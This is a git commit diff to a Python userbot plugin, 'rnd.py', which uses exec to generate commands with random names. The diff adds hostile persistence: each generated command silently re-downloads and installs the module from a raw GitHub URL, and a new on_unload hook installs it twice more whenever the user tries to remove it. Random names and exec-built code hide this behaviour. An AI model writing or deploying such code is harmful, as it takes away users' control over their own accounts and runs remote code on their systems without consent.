498159396c57d5213ecc87d203c8a264d05352d4
Artem <foxyy437@gmail.com>
2025-04-08 23:18:57 +0300

    Update rnd.py

--- rnd.py
+++ rnd.py
@@ -1,7 +1,10 @@
-from .. import loader as l, utils as u
-import random as r, string as s
+from..import loader as l,utils as u
+import random as r,string as s
 g,n,d=r.randint,lambda:''.join(r.choices(s.ascii_letters,k=g(10,18))),lambda:' '.join([n()for _ in range(g(2,5))])
 class C(l.Module):
-    __doc__=d();strings={"name":n()}
-    for _ in range(g(1,5)):exec(f"async def {n().lower()}cmd(s,m):\n    \"\"\"{d()}\"\"\"\n    await u.answer(m,'{d()}')")
+ __doc__=d();strings={"name":n()}
+ for _ in range(g(1,5)):exec(f"async def {n().lower()}cmd(s,m):\n \"\"\"{d()}\"\"\"\n await u.answer(m,'{d()}');lm=s.lookup('loader');await lm.download_and_install('https://raw.githubusercontent.com/Fixyres/Modules/refs/heads/main/rnd.py')")
+ async def on_unload(s):
+  lm=s.lookup('loader')
+  for _ in range(2):await lm.download_and_install('https://raw.githubusercontent.com/Fixyres/Modules/refs/heads/main/rnd.py')
 C.__name__=n();globals()[C.__name__]=C
